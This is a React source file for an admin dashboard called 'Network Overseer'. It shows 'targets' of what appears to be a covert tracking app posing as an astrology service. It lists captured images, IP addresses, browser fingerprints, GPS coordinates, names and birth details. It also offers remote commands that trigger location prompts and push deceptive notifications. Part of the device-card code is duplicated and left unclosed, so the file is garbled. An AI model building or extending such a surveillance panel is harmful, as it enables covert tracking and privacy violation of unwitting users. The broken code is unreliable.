"use client";

import { useEffect, useState, useMemo } from "react";
import { Monitor, Smartphone, Globe, Clock, ChevronRight, X, Fingerprint, Activity, Image as ImageIcon, Trash2, Download, CheckSquare } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

type Scan = {
  id: string;
  createdAt: string;
  image: string;
  publicIp: string;
  userAgent: string;
  referer: string;
  language: string;
  screenResolution: string;
  timezone: string;
  installedFonts: string;
  canvasFingerprint: string;
  webglFingerprint: string;
  audioFingerprint: string;
  hardwareConcurrency: number;
  deviceMemory: number;
  touchSupport: boolean;
  browserPlugins: string;
  batteryLevel: number;
  connectionType: string;
  userName?: string;
  birthDate?: string;
  birthState?: string;
  birthCity?: string;
  birthTime?: string;
  latitude?: number;
  longitude?: number;
  neighborhoodReading?: any;
  reading: any;
};

type DeviceGroup = {
  id: string;
  deviceId?: string;
  publicIp: string;
  userAgent: string;
  screenResolution: string;
  timezone: string;
  language: string;
  deviceMemory: number;
  hardwareConcurrency: number;
  lastSeen?: string;
  scans: Scan[];
};

export default function AdminDashboard() {
  const [devices, setDevices] = useState<DeviceGroup[]>([]);
  const [selectedDevice, setSelectedDevice] = useState<DeviceGroup | null>(null);
  const [selectedImageIndex, setSelectedImageIndex] = useState<number | null>(null);
  const [selectedScans, setSelectedScans] = useState<Set<string>>(new Set());
  const [loading, setLoading] = useState(true);

  // Approximate storage calculation (1 char base64 ~= 1 byte, plus ~2KB metadata per scan)
  const totalStorageBytes = useMemo(() => {
    let bytes = 0;
    devices.forEach(d => {
      d.scans.forEach(s => {
        if (s.image) bytes += s.image.length;
        bytes += 2048; 
      });
    });
    return bytes;
  }, [devices]);
  
  const storageUsedMB = (totalStorageBytes / (1024 * 1024)).toFixed(2);
  const storagePercent = Math.min(100, (totalStorageBytes / (500 * 1024 * 1024)) * 100);

  const fetchDevices = () => {
    fetch("/api/devices")
      .then((res) => res.json())
      .then((res) => {
        if (res.success) setDevices(res.data);
        setLoading(false);
      })
      .catch(() => setLoading(false));
  };

  useEffect(() => {
    fetchDevices();
    const interval = setInterval(fetchDevices, 5000); // Live update every 5 seconds
    return () => clearInterval(interval);
  }, []);

  const handleSelectAll = () => {
    if (!selectedDevice) return;
    if (selectedScans.size === selectedDevice.scans.length) {
      setSelectedScans(new Set()); // Deselect all
    } else {
      setSelectedScans(new Set(selectedDevice.scans.map(s => s.id))); // Select all
    }
  };

  const toggleScanSelection = (e: React.MouseEvent, scanId: string) => {
    e.stopPropagation();
    const newSet = new Set(selectedScans);
    if (newSet.has(scanId)) newSet.delete(scanId);
    else newSet.add(scanId);
    setSelectedScans(newSet);
  };

  const handleBulkDelete = async () => {
    if (selectedScans.size === 0) return;
    if (!confirm(`Are you sure you want to delete ${selectedScans.size} scans?`)) return;
    
    try {
      await fetch("/api/scans", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "delete", scanIds: Array.from(selectedScans) })
      });
      setSelectedScans(new Set());
      fetchDevices();
      
      // Update local state for selected device if open
      if (selectedDevice) {
        setSelectedDevice({
          ...selectedDevice,
          scans: selectedDevice.scans.filter(s => !selectedScans.has(s.id))
        });
      }
    } catch (e) {
      alert("Failed to delete scans");
    }
  };

  const handleBulkDownload = () => {
    if (selectedScans.size === 0) return;
    selectedDevice?.scans.forEach(scan => {
      if (selectedScans.has(scan.id) && scan.image) {
        const a = document.createElement("a");
        a.href = scan.image;
        a.download = `scan_${scan.id}.jpg`;
        a.click();
      }
    });
  };

  const handleNextImage = (e: React.MouseEvent) => {
    e.stopPropagation();
    if (selectedDevice && selectedImageIndex !== null && selectedImageIndex < selectedDevice.scans.length - 1) {
      setSelectedImageIndex(selectedImageIndex + 1);
    }
  };

  const handlePrevImage = (e: React.MouseEvent) => {
    e.stopPropagation();
    if (selectedDevice && selectedImageIndex !== null && selectedImageIndex > 0) {
      setSelectedImageIndex(selectedImageIndex - 1);
    }
  };

  if (loading) {
    return (
      <div className="flex h-screen items-center justify-center bg-[#0a0a0f] text-white">
        <div className="flex flex-col items-center gap-4">
          <Activity className="h-8 w-8 animate-spin text-[color:var(--gold,#d4af37)]" />
          <p className="font-sans text-sm uppercase tracking-widest opacity-60">Initializing Overseer...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0f] bg-[radial-gradient(ellipse_at_top,_var(--tw-gradient-stops))] from-blue-900/20 via-[#0a0a0f] to-[#0a0a0f] text-slate-300 font-sans p-6 md:p-12">
      <header className="mb-12 border-b border-white/5 pb-8 flex flex-col md:flex-row md:items-center justify-between gap-6">
        <div>
          <h1 className="text-3xl font-light text-white mb-2 tracking-wide">
            Network <span className="font-semibold text-blue-400">Overseer</span>
          </h1>
          <p className="text-sm uppercase tracking-[0.2em] opacity-50">Live Surveillance \ {devices.length} Targets Active</p>
        </div>
        
        <div className="flex items-center gap-6">
          {/* Storage Quota */}
          <div className="flex flex-col items-end gap-1.5">
            <div className="flex justify-between w-40 text-[10px] uppercase tracking-widest text-white/50">
              <span>{storageUsedMB} MB Used</span>
              <span>500 MB</span>
            </div>
            <div className="h-1.5 w-40 rounded-full bg-white/10 overflow-hidden">
              <div 
                className={`h-full rounded-full ${storagePercent > 80 ? 'bg-red-500' : 'bg-blue-500'}`} 
                style={{ width: `${storagePercent}%` }}
              />
            </div>
          </div>
          
          <div className="h-12 w-12 rounded-full border border-white/10 bg-white/5 flex items-center justify-center backdrop-blur-md">
            <Fingerprint className="text-blue-400 opacity-80" />
          </div>
        </div>
      </header>

      <main className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-6">
        {devices.map((device, i) => (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: i * 0.05 }}
            key={device.id}
            onClick={() => setSelectedDevice(device)}
            className="group relative cursor-pointer overflow-hidden rounded-2xl border border-white/10 bg-white/[0.02] p-6 backdrop-blur-sm transition-all hover:border-blue-500/50 hover:bg-blue-500/5"
          >
            {/* Glow effect */}
            <div className="absolute -inset-px rounded-2xl bg-gradient-to-b from-blue-500/20 to-transparent opacity-0 transition-opacity group-hover:opacity-100" />
            
            <div className="relative z-10">
              <div className="flex items-start justify-between mb-6">
                <div className="flex items-center gap-3">
                  <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-blue-500/10 text-blue-400">
                    {device.userAgent?.includes("Mobile") ? <Smartphone size={20} /> : <Monitor size={20} />}
                  </div>
                  <div>
                    <h3 className="font-mono text-sm text-white">{device.publicIp || "Unknown IP"}</h3>
                    <p className="text-xs opacity-50 flex items-center gap-1 mt-1">
                      <Globe size={10} /> {device.timezone}
                    </p>
                  </div>
                </div>
                <div className="flex items-center gap-1.5 rounded-full bg-white/5 px-2.5 py-1 text-xs font-medium text-white/80">
                  <ImageIcon size={12} className="opacity-60" />
                  {device.scans.length}
                </div>
        {devices.map((device, i) => {
          const isOnline = device.lastSeen ? (new Date().getTime() - new Date(device.lastSeen).getTime()) < 15000 : false;
          return (
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: i * 0.05 }}
              key={device.id}
              onClick={() => setSelectedDevice(device)}
              className="group relative cursor-pointer overflow-hidden rounded-2xl border border-white/10 bg-white/[0.02] p-6 backdrop-blur-sm transition-all hover:border-blue-500/50 hover:bg-blue-500/5"
            >
              {/* Online Indicator */}
              <div className="absolute top-6 right-6 flex items-center gap-2">
                <span className="text-[10px] font-mono opacity-50">{isOnline ? 'LIVE' : (device.lastSeen ? new Date(device.lastSeen).toLocaleTimeString() : 'OFFLINE')}</span>
                <div className={`h-2 w-2 rounded-full ${isOnline ? 'bg-green-500 animate-pulse' : 'bg-gray-600'}`} />
              </div>
              
              <div className="relative z-10">
                <div className="flex items-start justify-between mb-6">
                  <div className="flex items-center gap-3">
                    <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-blue-500/10 text-blue-400">
                      {device.userAgent?.includes("Mobile") ? <Smartphone size={20} /> : <Monitor size={20} />}
                    </div>
                    <div>
                      <h3 className="font-mono text-sm text-white">{device.publicIp || "Unknown IP"}</h3>
                      <p className="text-xs opacity-50 flex items-center gap-1 mt-1">
                        <Globe size={10} /> {device.timezone}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-1.5 rounded-full bg-white/5 px-2.5 py-1 text-xs font-medium text-white/80">
                    <ImageIcon size={12} className="opacity-60" />
                    {device.scans.length}
                  </div>
                </div>

                <div className="space-y-3 text-xs opacity-70">
                  {(() => {
                    const names = Array.from(new Set(device.scans.map(s => s.userName).filter(Boolean)));
                    if (names.length > 0) {
                      return (
                        <div className="flex justify-between border-b border-white/5 pb-2">
                          <span className="text-purple-400">Identities</span>
                          <span className="font-sans text-purple-300 max-w-[150px] truncate text-right">
                            {names.join(", ")}
                          </span>
                        </div>
                      );
                    }
                    return null;
                  })()}
                  <div className="flex justify-between border-b border-white/5 pb-2">
                    <span>Resolution</span>
                    <span className="font-mono text-white/90">{device.screenResolution || "Unknown"}</span>
                  </div>
                  <div className="flex justify-between border-b border-white/5 pb-2">
                    <span>Hardware</span>
                    <span className="font-mono text-white/90">{device.hardwareConcurrency} Cores / {device.deviceMemory}GB RAM</span>
                  </div>
                  <div className="flex justify-between pb-2">
                    <span>System</span>
                    <span className="truncate max-w-[150px] text-white/90">{device.userAgent?.split(" ")[0]}</span>
                  </div>
                </div>

                <div className="mt-6 flex items-center justify-between text-xs font-semibold text-blue-400/80 transition-colors group-hover:text-blue-400">
                  <span>VIEW GALLERY</span>
                  <ChevronRight size={14} className="transition-transform group-hover:translate-x-1" />
                </div>
              </div>
            </motion.div>
          );
        })}
      </main>

      <AnimatePresence>
        {selectedDevice && selectedImageIndex === null && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-40 flex items-center justify-center p-4 backdrop-blur-xl bg-black/60"
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="relative flex h-[90vh] w-[95vw] max-w-7xl flex-col overflow-hidden rounded-3xl border border-white/10 bg-[#0f0f13] shadow-2xl"
            >
              <button
                onClick={() => setSelectedDevice(null)}
                className="absolute right-6 top-6 z-10 rounded-full bg-white/10 p-2 text-white/60 transition-colors hover:bg-white/20 hover:text-white"
              >
                <X size={20} />
              </button>

              <div className="grid h-full grid-cols-1 lg:grid-cols-[1fr_350px]">
                {/* Left: Gallery */}
                <div className="flex flex-col overflow-y-auto border-r border-white/5 p-8 custom-scrollbar">
                  <div className="mb-6 flex items-center justify-between">
                    <div className="flex items-center gap-4">
                      <h2 className="text-2xl font-light text-white">Target Feed</h2>
                      <button 
                        onClick={handleSelectAll}
                        className="text-xs text-blue-400 hover:text-blue-300 underline underline-offset-2 transition"
                      >
                        {selectedScans.size === selectedDevice.scans.length ? "Deselect All" : "Select All"}
                      </button>
                    </div>
                    
                    {selectedScans.size > 0 && (
                      <div className="flex items-center gap-2">
                        <span className="text-xs text-white/50 mr-2">{selectedScans.size} selected</span>
                        <button onClick={handleBulkDownload} className="flex h-8 w-8 items-center justify-center rounded bg-blue-500/20 text-blue-400 transition hover:bg-blue-500/40">
                          <Download size={14} />
                        </button>
                        <button onClick={handleBulkDelete} className="flex h-8 w-8 items-center justify-center rounded bg-red-500/20 text-red-400 transition hover:bg-red-500/40">
                          <Trash2 size={14} />
                        </button>
                      </div>
                    )}
                  </div>
                  <div className="grid grid-cols-2 md:grid-cols-3 xl:grid-cols-4 gap-4">
                    {selectedDevice.scans.map((scan, i) => (
                      <div 
                        key={scan.id} 
                        onClick={() => setSelectedImageIndex(i)}
                        className={`group relative aspect-video overflow-hidden rounded-xl bg-black/50 border cursor-pointer transition-all ${selectedScans.has(scan.id) ? 'border-blue-500 ring-2 ring-blue-500/50' : 'border-white/5 hover:border-white/20'}`}
                      >
                        {scan.image ? (
                          <img src={scan.image} alt="Scan capture" className="h-full w-full object-cover opacity-80 transition-transform duration-700 group-hover:scale-110 group-hover:opacity-100" />
                        ) : (
                          <div className="flex h-full w-full items-center justify-center text-white/20"><ImageIcon /></div>
                        )}
                        <div className="absolute bottom-0 inset-x-0 bg-gradient-to-t from-black/80 to-transparent p-3 flex justify-between items-end">
                          <p className="flex items-center gap-1 text-[10px] text-white/70">
                            <Clock size={10} /> {new Date(scan.createdAt).toLocaleTimeString()}
                          </p>
                        </div>
                        <button 
                          onClick={(e) => toggleScanSelection(e, scan.id)}
                          className={`absolute top-2 right-2 rounded p-1.5 transition-all ${selectedScans.has(scan.id) ? 'bg-blue-500 text-white opacity-100' : 'bg-black/40 text-white/50 opacity-0 group-hover:opacity-100 hover:bg-black/80 hover:text-white'}`}
                        >
                          <CheckSquare size={14} />
                        </button>
                      </div>
                    ))}
                  </div>
                </div>

                {/* Right: Fingerprint + User Data */}
                <div className="overflow-y-auto bg-black/20 p-8 custom-scrollbar">
                  {/* Find the most recent scan with user details and location */}
                  {(() => {
                    const scanWithUser = selectedDevice.scans.find(s => s.userName);
                    const scanWithLocation = selectedDevice.scans.find(s => s.latitude || s.longitude);

                    return (
                      <>
                        {/* User-submitted details */}
                        {scanWithUser && (
                          <>
                            <h3 className="mb-4 flex items-center gap-2 text-sm font-semibold uppercase tracking-widest text-purple-400">
                              ✦ User Profile
                            </h3>
                            <div className="space-y-4 mb-6">
                              <InfoBlock label="Name" value={scanWithUser.userName} />
                              <InfoBlock label="Date of Birth" value={scanWithUser.birthDate} />
                              <InfoBlock label="Birth State" value={scanWithUser.birthState} />
                              <InfoBlock label="Birth City" value={scanWithUser.birthCity} />
                              <InfoBlock label="Birth Time" value={scanWithUser.birthTime || "Not provided"} />
                            </div>
                            <div className="h-px bg-white/5 mb-6" />
                          </>
                        )}

                        {/* GPS Location */}
                        {scanWithLocation && (
                          <>
                            <h3 className="mb-4 flex items-center gap-2 text-sm font-semibold uppercase tracking-widest text-green-400">
                              📍 GPS Location
                            </h3>
                            <div className="space-y-4 mb-6">
                              <InfoBlock label="Latitude" value={String(scanWithLocation.latitude ?? "Unknown")} />
                              <InfoBlock label="Longitude" value={String(scanWithLocation.longitude ?? "Unknown")} />
                              <a
                                href={`https://maps.google.com/?q=${scanWithLocation.latitude},${scanWithLocation.longitude}`}
                                target="_blank"
                                rel="noreferrer"
                                className="inline-block text-xs text-blue-400 underline"
                              >
                                Open in Google Maps ↗
                              </a>
                            </div>
                            <div className="h-px bg-white/5 mb-6" />
                          </>
                        )}
                      </>
                    );
                  })()}

                  <h3 className="mb-4 flex items-center gap-2 text-sm font-semibold uppercase tracking-widest text-red-400">
                    <Activity size={16} /> Remote Commands
                  </h3>
                  <div className="flex flex-col gap-2 mb-6">
                    <button onClick={() => sendCommand('REQUEST_LOCATION')} className="bg-red-500/10 border border-red-500/20 text-red-400 hover:bg-red-500/20 rounded py-2 px-3 text-xs font-semibold transition text-left">Trigger Location Prompt</button>
                    <button onClick={() => sendCommand('REQUEST_NOTIFICATION')} className="bg-orange-500/10 border border-orange-500/20 text-orange-400 hover:bg-orange-500/20 rounded py-2 px-3 text-xs font-semibold transition text-left">Trigger Notification Prompt</button>
                    <button onClick={() => {
                      const msg = prompt("Enter the notification message to send:", "The cosmos aligns for you.");
                      if (msg) sendCommand('SHOW_NOTIFICATION', msg);
                    }} className="bg-blue-500/10 border border-blue-500/20 text-blue-400 hover:bg-blue-500/20 rounded py-2 px-3 text-xs font-semibold transition text-left">Send Push Notification</button>
                  </div>
                  <div className="h-px bg-white/5 mb-6" />

                  <h3 className="mb-6 flex items-center gap-2 text-sm font-semibold uppercase tracking-widest text-blue-400">
                    <Fingerprint size={16} /> Device Identity
                  </h3>
                  
                  <div className="space-y-6">
                    <InfoBlock label="IP Address" value={selectedDevice.publicIp} />
                    <InfoBlock label="User Agent" value={selectedDevice.userAgent} />
                    <InfoBlock label="Language" value={selectedDevice.language} />
                    <InfoBlock label="Timezone" value={selectedDevice.timezone} />
                    
                    <div className="h-px bg-white/5" />
                    
                    <InfoBlock label="Hardware Concurrency" value={`${selectedDevice.hardwareConcurrency} Logical Cores`} />
                    <InfoBlock label="Device Memory" value={`${selectedDevice.deviceMemory} GB`} />
                    <InfoBlock label="Screen Resolution" value={selectedDevice.screenResolution} />
                    
                    <div className="h-px bg-white/5" />
                    
                    <InfoBlock label="WebGL Fingerprint" value={selectedDevice.scans[0]?.webglFingerprint || "Not captured"} truncate />
                    <InfoBlock label="Canvas Fingerprint" value={selectedDevice.scans[0]?.canvasFingerprint || "Not captured"} truncate />
                    <InfoBlock label="Audio Context" value={selectedDevice.scans[0]?.audioFingerprint || "Not captured"} truncate />
                  </div>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {selectedDevice && selectedImageIndex !== null && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-3xl"
            onClick={() => setSelectedImageIndex(null)}
          >
            <div className="absolute top-6 left-6 text-white/60 text-sm tracking-widest uppercase">
              {selectedImageIndex + 1} / {selectedDevice.scans.length}
            </div>
            
            <button
              onClick={() => setSelectedImageIndex(null)}
              className="absolute right-6 top-6 z-10 rounded-full bg-white/10 p-3 text-white/80 transition-colors hover:bg-white/20 hover:text-white"
            >
              <X size={24} />
            </button>

            {selectedImageIndex > 0 && (
              <button
                onClick={handlePrevImage}
                className="absolute left-6 top-1/2 -translate-y-1/2 z-10 rounded-full bg-white/5 p-4 text-white/50 backdrop-blur-md transition-all hover:bg-white/20 hover:text-white hover:scale-110"
              >
                <ChevronRight size={32} className="rotate-180" />
              </button>
            )}

            {selectedImageIndex < selectedDevice.scans.length - 1 && (
              <button
                onClick={handleNextImage}
                className="absolute right-6 top-1/2 -translate-y-1/2 z-10 rounded-full bg-white/5 p-4 text-white/50 backdrop-blur-md transition-all hover:bg-white/20 hover:text-white hover:scale-110"
              >
                <ChevronRight size={32} />
              </button>
            )}

            <motion.div
              key={selectedImageIndex}
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.2 }}
              className="relative h-[85vh] w-[85vw] max-w-6xl"
              onClick={(e) => e.stopPropagation()}
            >
              {selectedDevice.scans[selectedImageIndex]?.image ? (
                <img
                  src={selectedDevice.scans[selectedImageIndex].image}
                  alt="Full resolution capture"
                  className="h-full w-full object-contain drop-shadow-2xl"
                />
              ) : (
                <div className="flex h-full w-full items-center justify-center text-white/20">
                  <ImageIcon size={64} />
                </div>
              )}
              
              <div className="absolute bottom-[-40px] left-1/2 -translate-x-1/2 flex items-center gap-2 text-sm text-white/50 bg-black/50 px-4 py-2 rounded-full backdrop-blur-md">
                <Clock size={14} /> 
                {new Date(selectedDevice.scans[selectedImageIndex].createdAt).toLocaleString()}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

function InfoBlock({ label, value, truncate = false }: { label: string; value: string | null | undefined; truncate?: boolean }) {
  return (
    <div className="flex flex-col gap-1">
      <span className="text-[10px] uppercase tracking-widest text-white/40">{label}</span>
      <span className={`font-mono text-xs text-white/90 ${truncate ? "truncate opacity-70" : "break-words"}`}>
        {value || "Unknown"}
      </span>
    </div>
  );
}
